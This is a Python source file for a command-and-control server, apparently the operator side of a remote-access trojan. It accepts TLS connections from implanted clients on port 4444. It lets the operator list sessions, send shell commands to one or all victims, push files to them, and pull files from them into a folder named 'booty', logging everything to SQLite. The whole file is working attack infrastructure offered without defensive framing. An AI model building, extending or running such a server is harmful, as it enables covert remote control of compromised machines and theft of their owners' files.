import os
import socket
import threading
import db_logger
import ssl

# ── GLOBALS ─────────────────────────────────────────────────────────────
CHUNK_SIZE = 262144  # 256 KB
clients = {} 
client_id = 0
lock = threading.Lock()

_db_record_open = lambda cid, ip, port: None
_db_record_close = lambda cid: None
_db_record_command = lambda cid, cmd: None
_db_record_response = lambda cid, data: None

# ── UTILITIES ───────────────────────────────────────────────────────────
def box_runtime(msg: str):
    bar = "─" * (len(msg) + 2)
    print(f"┌{bar}┐")
    print(f"│ {msg} │")
    print(f"└{bar}┘")

def recv_line(sock: socket.socket) -> str | None:
    data = b""
    while True:
        chunk = sock.recv(1)
        if not chunk:
            return None if not data else data.decode("utf-8", errors="ignore")
        if chunk == b"\n":
            break
        data += chunk
    return data.decode("utf-8", errors="ignore")

def recv_exact(sock: socket.socket, size: int) -> bytes:
    data = bytearray()
    while len(data) < size:
        chunk = sock.recv(min(CHUNK_SIZE, size - len(data)))
        if not chunk:
            raise ConnectionError("Connection closed while receiving file data")
        data.extend(chunk)
    return bytes(data)

# ── FILE TRANSFER ───────────────────────────────────────────────────────
def server_send_file(conn: socket.socket):
    base_dir = "files_to_share"
    os.makedirs(base_dir, exist_ok=True)
    filename = input("Enter filename to send (inside files_to_share): ").strip()
    if not filename:
        print("[!] No filename entered.")
        return

    path = os.path.join(base_dir, filename)
    if not os.path.isfile(path):
        print(f"[!] File not found in {base_dir}: {filename}")
        return

    size = os.path.getsize(path)
    print(f"[*] Sending {filename} ({size} bytes) to client...")
    conn.sendall(f"FILE {filename} {size}\n".encode())
    with open(path, "rb") as f:
        while chunk := f.read(CHUNK_SIZE):
            conn.sendall(chunk)
    print("[+] File sent successfully.")
    globals().get("_db_record_transfer", lambda *_: None)(
    -1, "send", filename, size
)

def server_pull_file(cid, filename):
    if cid not in clients:
        print(f"[!] Client ID {cid} Not Found")
        return

    sock = clients[cid]

    try:
        sock.sendall(f"PULL {filename}\n".encode())
        header = recv_line(sock)

        if not header or not header.startswith("FILE "):
            print(f"[!] Invalid response header: {header}")
            return

        _, name, size_str = header.strip().split()
        size = int(size_str)

        globals().get("_db_record_transfer", lambda *_: None)(cid, "receive", name, size)

        os.makedirs("booty", exist_ok=True)
        path = os.path.join("booty", name)

        print(f"[*] Receiving {name} ({size} bytes) from client ID {cid}...")

        with open(path, "wb") as f:
            remaining = size
            while remaining > 0:
                chunk = sock.recv(min(CHUNK_SIZE, remaining))
                if not chunk:
                    raise ConnectionError("Connection closed during file receive")
                f.write(chunk)
                remaining -= len(chunk)
                print(f" ...{size - remaining} / {size} bytes", end="\r")

        ack = recv_line(sock)
        if ack != "RECVOK":
            print(f"[!] Unexpected end ack from client: {ack}")
        else:
            print(f"\n[+] Pulled file saved to: {path}")

    except Exception as e:
        print(f"[!] Error pulling file from client: {e}")

# ── CLIENT HANDLING ─────────────────────────────────────────────────────
def handle_client(client_socket, client_address, cid):
    print(f"[+] New connection: ID {cid} from {client_address}")
    with lock:
        clients[cid] = client_socket

    peer_ip, peer_port = client_address
    _db_record_open(cid, peer_ip, peer_port)

    try:
        buffer = ""
        while True:
            data = client_socket.recv(4096).decode("utf-8", errors="ignore")
            if not data:
                break
            buffer += data
            while "\n" in buffer:
                line, buffer = buffer.split("\n", 1)
                print(f"[ID {cid}] Response: {line.strip()}")
                _db_record_response(cid, line.strip())

    except Exception as e:
        print(f"[!] Error with client ID {cid}: {e}")
    finally:
        with lock:
            clients.pop(cid, None)
        client_socket.close()
        print(f"[-] Client ID {cid} Disconnected")
        _db_record_close(cid)

# ── COMMAND EXECUTION ───────────────────────────────────────────────────
def send_command_to_client(cid, command):
    with lock:
        if cid in clients:
            try:
                if command == "sendfile":
                    server_send_file(clients[cid])
                elif command.startswith("pull "):
                    filename = command[5:].strip()
                    server_pull_file(cid, filename)
                else:
                    clients[cid].sendall((command + "\n").encode("utf-8"))
                    print(f"[*] Sent Command TO ID {cid}")
                    _db_record_command(cid, command)
            except Exception as e:
                print(f"[!] Error Sending To ID {cid}: {e}")
        else:
            print(f"[!] Client ID {cid} Not Found")

def broadcast_command(command):
    with lock:
        for cid, sock in clients.items():
            try:
                sock.sendall((command + "\n").encode("utf-8"))
                print(f"[*] Sent Command to ID {cid}")
            except Exception as e:
                print(f"[!] Broadcast error for ID {cid}: {e}")

# ── SESSION LISTING ─────────────────────────────────────────────────────
def list_sessions():
    with lock:
        if not clients:
            print("[!] No Active Sessions")
        else:
            print("[*] Active Sessions:")
            for cid in clients:
                print(f" ID {cid}")

# ── INTERACTIVE SHELL ───────────────────────────────────────────────────
def server_shell():
    global client_id
    while True:
        cmd = input("C2S> ").strip()
        if cmd == "sessions":
            list_sessions()

        elif cmd.startswith("interact "):
            try:
                cid = int(cmd.split()[1])
                if cid in clients:
                    print(f"[*] Interaction with ID {cid}. Type 'background' to exit.")
                    while True:
                        sub_cmd = input(f"ID {cid}> ").strip()
                        if sub_cmd == "background":
                            break
                        elif sub_cmd == "sendfile":
                            server_send_file(clients[cid])
                        elif sub_cmd.startswith("pull "):
                            server_pull_file(cid, sub_cmd[5:].strip())
                        elif sub_cmd:
                            send_command_to_client(cid, sub_cmd)
                else:
                    print(f"[!] Client ID {cid} Not Found")
            except:
                print("[!] Usage: interact <client id>")

        elif cmd.startswith("broadcast "):
            broadcast_command(cmd[10:].strip())

        elif cmd == "help":
            print("[*] Commands:\n"
                  " sessions              - List all active client sessions\n"
                  " interact <id>         - Open an interactive prompt with a client\n"
                  " background            - Return to the main prompt\n"
                  " broadcast <command>   - Send a command to all clients\n"
                  " sendfile              - Send a file to one client (in interact mode only)\n"
                  " pull <path>           - Pull file from client into ./booty/\n"
                  " help                  - Show this help\n"
                  " exit                  - Shut down the server")

        elif cmd == "exit":
            print("[!] Shutting Down Server")
            with lock:
                for sock in clients.values():
                    sock.close()
            os._exit(0)

        else:
            print("[!] ERROR Unknown Command. Type help for more.")

# ── SERVER ENTRY POINT ──────────────────────────────────────────────────
def main():
    global _db_record_open, _db_record_close, _db_record_command, _db_record_response, _db_record_transfer
    db_path = os.getenv("C2_DB_PATH", "data/c2_logs.sqlite3")
    conn = db_logger.init_db(db_path)
    
    _db_record_open = lambda cid, ip, port: db_logger.record_session_open(conn, cid, ip, port)
    _db_record_close = lambda cid: db_logger.record_session_close(conn, cid)
    _db_record_command = lambda cid, cmd: db_logger.record_command(conn, cid, cmd)
    _db_record_response = lambda cid, data: db_logger.record_response(conn, cid, data)
    _db_record_transfer = lambda cid, direction, name, size: db_logger.record_file_transfer(conn, cid, direction, name, size)
    
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile="server.crt", keyfile="server.key")

    global client_id
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', 4444))
    server.listen(5)
    box_runtime("[*] Server Listening on Port: 4444")

    threading.Thread(target=server_shell, daemon=True).start()
    try:
        while True:
            raw_sock, client_address = server.accept()
            try:
                client_socket = context.wrap_socket(raw_sock, server_side=True)
            except Exception as e:
                print(f"[!] Failed to wrap connectionin TlS: {e}")
                raw_sock.close()
                continue
            with lock:
                client_id += 1
                threading.Thread(target=handle_client, args=(client_socket, client_address, client_id), daemon=True).start()
    except KeyboardInterrupt:
        print("[!] Shutting Down Server")
        server.close()

if __name__ == "__main__":
    main()
